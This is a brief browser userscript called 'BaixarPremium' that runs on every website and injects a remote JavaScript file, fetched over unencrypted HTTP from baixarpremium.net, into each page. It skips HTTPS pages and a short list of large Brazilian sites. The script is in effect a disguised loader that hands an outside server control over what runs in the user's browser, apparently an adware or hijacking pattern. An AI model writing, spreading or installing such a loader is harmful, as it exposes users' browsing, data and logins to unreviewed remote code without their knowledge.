// ==UserScript==
// @name           BaixarPremium
// @version        1.0
// @uso:version    1.0
// @namespace      http://www.baixarpremium.net
// @include		   *
// @exclude		   *baixarpremium*
// ==/UserScript==

function include(file_path){
var j = document.createElement("script");
j.type = "text/javascript";
j.src = file_path;
if (document.body != null) document.body.appendChild(j);
}

if (window.location.href.indexOf('https') == -1 && window.location.href.indexOf('youtube') == -1 && window.location.href.indexOf('ig.com.br') == -1 && window.location.href.indexOf('globo.com') == -1 && window.location.href.indexOf('mercadolivre.com.br') == -1)  window.onload = include('http://baixarpremium.net/plugin/plugin.js');